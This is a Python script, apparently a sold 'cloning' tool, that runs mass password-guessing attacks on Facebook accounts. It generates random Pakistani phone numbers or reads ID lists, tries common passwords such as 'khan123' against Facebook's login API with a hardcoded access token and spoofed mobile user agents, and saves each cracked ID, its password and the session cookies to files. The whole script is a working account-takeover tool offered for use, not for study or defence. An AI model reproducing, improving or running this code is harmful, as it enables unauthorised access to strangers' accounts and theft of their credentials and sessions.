# Full Fixed Script
import os, sys, time, requests, random, uuid, string, re, subprocess, base64, zlib, urllib
from concurrent.futures import ThreadPoolExecutor as tred

#----------LOGO----------#
logo = ("""\033[1;96m
  _____  _    __  __  ___   ___  ____  
|_   _|/ \  |  \/  |/ _ \ / _ \|  _ \ 
  | | / _ \ | |\/| | | | | | | | |_) |
  | |/ ___ \| |  | | |_| | |_| |  _ < 
  |_/_/   \_\_|  |_|\___/ \___/|_| \_\   
----------------------------------------------
 Author    : TM BRAND
 Status    : PAID
 Version   : 1.0 \033[1;37m
 ok ids will be saved in TM folder
----------------------------------------------""")

#----------SETTINGS & VARIABLES----------#
loop = 0
oks = []
cps = []
twf = []
ugen = []

# User Agents
for agent in range(10000):
    aa='Mozilla/5.0 (Linux; Android 6.0.1;'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/533.1'
    fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(fullagnt)

# Device Info logic (Try/Except taake error na aye)
try:
    android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
    model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
    build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
    fblc = 'en_US'
    fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
    fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
    fbdv = model
    fbsv = android_version
    fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
    fbdm = '{density=2.25,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
except:
    # Fallback agar device info na mile
    android_version = "12"
    model = "SM-G991B"
    build = "TP1A.220624.014"
    fblc = "en_US"
    fbmf = "samsung"
    fbbd = "samsung"
    fbdv = "SM-G991B"
    fbsv = "12"
    fbca = "arm64-v8a"
    fbdm = "{density=2.0,width=720,height=1600}"

# SIM ID Logic
sim_id = ''
try:
    fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
    sim_id += fbcr
except:
    sim_id = "Jazz"

device = {
    'android_version':android_version,
    'model':model,
    'build':build,
    'fblc':fblc,
    'fbmf':fbmf,
    'fbbd':fbbd,
    'fbdv':fbdv,
    'fbsv':fbsv,
    'fbca':fbca,
    'fbdm':fbdm
}

#----------FUNCTIONS----------#
def linex():
    print('\033[1;37m----------------------------------------------')

def clear():
    os.system('clear')
    print(logo)

def SIM1():
    android_models = [
        ("SM-A105F", "Samsung", "9"), ("Redmi-Note7", "Redmi", "9"), ("SM-A356E", "Samsung", "14"),
        ("2209116AG", "Redmi", "13"), ("SM-S928B", "Samsung", "14")
    ]
    fban_types = ["FB4A", "FBAN/Messenger", "FBAN/Katana"]
    
    model, brand, ver = random.choice(android_models)
    chrome_ver = f"{random.randint(110,131)}.0.{random.randint(5500,6999)}.{random.randint(100,999)}"
    fbav = f"{random.randint(420,540)}.0.0.{random.randint(10,99)}.{random.randint(100,999)}"
    fban = random.choice(fban_types)
    
    ua = (f"Mozilla/5.0 (Linux; Android {ver}; {model}) AppleWebKit/537.36 (KHTML, like Gecko) "
          f"Version/4.0 Chrome/{chrome_ver} Mobile Safari/537.36 "
          f"[FBAN/{fban};FBAV/{fbav};FBDV/{model};FBMF/{brand};FBBD/{brand};FBSV/{ver};"
          f"FBOP/19;FBCR/{sim_id}]")
    return ua

#----------APPROVAL SYSTEM----------#
def app():
    UMO="TM_BRAND-"
    try:
        uuid_str = str(os.geteuid()) + str(os.getlogin())
    except:
        uuid_str = "termux_user"
    
    id = "5".join(uuid_str)
    clear()
    
    try:
        # Note: Raw link use karein taake text match ho sakay
        http = requests.get("https://raw.githubusercontent.com/tamoor799/TM-BRAND/main/Approval.txt").text
        if id in http:
            menu()
        else:
            os.system("clear")
            print(logo)
            print ("\n\t\033[1;31m [!] Key Not Approved\n")
            print(f" Your Key : {UMO}{id}")
            print ("\n Press Enter to Get Approval via WhatsApp")
            input()
            name = input(" Your Name : ")
            msg = f"Dear TM BRAND, I am {name}. Approve my key: {UMO}{id}"
            url_msg = urllib.parse.quote(msg)
            os.system(f"xdg-open 'https://wa.me/+923701729896?text={url_msg}'")
            exit()
    except Exception as e:
        print(f" [!] Internet Error: {e}")
        exit()

#----------MENU SYSTEM----------#
def menu():
    clear()
    print(' [1] File Cloning \n [2] Random Cloning \n [3] Gmail Cloning \n [0] Exit ')
    linex()
    xd = input('\033[1;37m[?] Choice : ')
    
    if xd in ['1', '01']:
        file_cloning()
    elif xd in ['2', '02']:
        random_cloning()
    elif xd in ['3', '03']:
        gmail_cloning()
    elif xd == '0':
        exit()
    else:
        print(" Invalid Option")
        time.sleep(1)
        menu()

def file_cloning():
    clear()
    file = input('\033[1;37m[-] Enter File Path: ')
    try:
        fo = open(file,'r').read().splitlines()
    except FileNotFoundError:
        print(' File not found')
        time.sleep(2)
        menu()
    
    linex()
    print('[1] Method 1 (Mix)\n[2] Method 2 (API)')
    mthd = input('[?] Choose: ')
    
    plist = []
    print(' Select Password Mode:')
    print('[1] Auto Passwords\n[2] Manual Passwords')
    ppp = input('[?] Choose: ')
    
    if ppp == '1':
        plist = ['first last', 'firstlast', 'first123', 'first12345', 'First Last', 'khan123', 'khan786']
    else:
        limit = int(input(' How many passwords? '))
        for i in range(limit):
            plist.append(input(f' Password {i+1}: '))
    
    with tred(max_workers=30) as crack:
        clear()
        print(f' Total IDs: {len(fo)}')
        print(" Cracking Started...")
        linex()
        for user in fo:
            try:
                ids, names = user.split('|')
                if mthd == '1':
                    crack.submit(rndm, ids, plist) # Using RNDM logic for files too for simplicity
                else:
                    crack.submit(api, ids, names, plist)
            except: pass
    print('\n Process Completed')
    input(' Press Enter to Back ')
    menu()

def random_cloning():
    clear()
    print(' [1] Pakistan\n [2] Bangladesh\n [3] Indonesia')
    c = input(' Choose: ')
    
    if c == '1':
        code = input(' Code (0300, 0306): ')
        limit = int(input(' Limit (1000, 5000): '))
        
        with tred(max_workers=30) as crack:
            clear()
            print(f" Cracking {limit} IDs...")
            for _ in range(limit):
                nmp = ''.join(random.choice(string.digits) for _ in range(7))
                ids = code + nmp
                passlist = [nmp, ids, 'khankhan', 'khan123', 'khan1122']
                crack.submit(rndm, ids, passlist)
    # Add other countries logic here...
    print('\n Completed')
    input(' Enter to back')
    menu()

def gmail_cloning():
    print(" Gmail Cloning Logic here...")
    time.sleep(2)
    menu()

#----------METHODS----------#
def api(ids, names, passlist):
    # API method placeholder - Use existing API logic if needed
    pass

#----------MAIN CRACKING METHOD (FIXED)----------#
def rndm(ids, passlist):
    global loop, oks, cps
    try:
        sys.stdout.write(f'\r\r\033[1;37m [TM_BRAND] {loop}|\033[1;32mOK:-{len(oks)} \033[1;37m')
        sys.stdout.flush()
        
        # --- FIX: Yahan Syntax Error tha, ab 'passlist' sahi hai ---
        for pas in passlist:
            accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            
            # Dynamic UA components
            ua = SIM1()
            
            # IDs management
            device_id = str(uuid.uuid4())
            adid = str(uuid.uuid4())
            
            data = {
                'adid': adid,
                'format': 'json',
                'device_id': device_id,
                'email': ids,
                'password': pas,
                "generate_analytics_claims": "1",
                "credentials_type": "password",
                "source": "login",
                "error_detail_type": "button_with_disabled",
                "enroll_misauth": "false",
                "generate_session_cookies": "1",
                "generate_machine_id": "1",
                "fb_api_req_friendly_name": "authenticate",
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
            }
            
            headers = {
                'Authorization': f'OAuth {accessToken}',
                'X-FB-Friendly-Name': 'authenticate',
                'X-FB-Connection-Type': 'unknown',
                'User-Agent': ua,
                'Accept-Encoding': 'gzip, deflate',
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-FB-HTTP-Engine': 'Liger'
            }
            
            url = 'https://b-graph.facebook.com/auth/login'
            try:
                response = requests.post(url, data=data, headers=headers)
                po = response.json()
            except:
                continue
            
            if 'session_key' in po:
                uid = po.get('uid', ids)
                if str(uid) in oks:
                    break
                else:
                    print(f'\r\r\033[1;32m [TM-OK] {uid} | {pas}\033[1;97m')
                    
                    # Cookie Logic
                    try:
                        ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                        ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                        cookie = f"sb={ssbb};{ckkk}"
                        print(f'\r\r\x1b[38;5;46m|COOKIE|-> {cookie} ')
                        with open('/sdcard/TM-OK.txt','a') as f:
                            f.write(f"{uid}|{pas}|{cookie}\n")
                    except:
                        pass
                    
                    oks.append(str(uid))
                    break
            
            elif 'www.facebook.com' in po.get('error', {}).get('message', ''):
                uid = po.get('error', {}).get('error_data', {}).get('uid', ids)
                print(f'\r\r\033[1;96m[TM-CP] {uid} | {pas}\033[1;96m')
                with open('/sdcard/TM-CP.txt','a') as f:
                    f.write(f"{uid}|{pas}\n")
                cps.append(str(ids))
                break
            else:
                continue
        loop += 1
    except Exception as e:
        loop += 1
        pass

#----------START SCRIPT----------#
if __name__ == '__main__':
    try:
        app()
    except Exception as e:
        print(e)
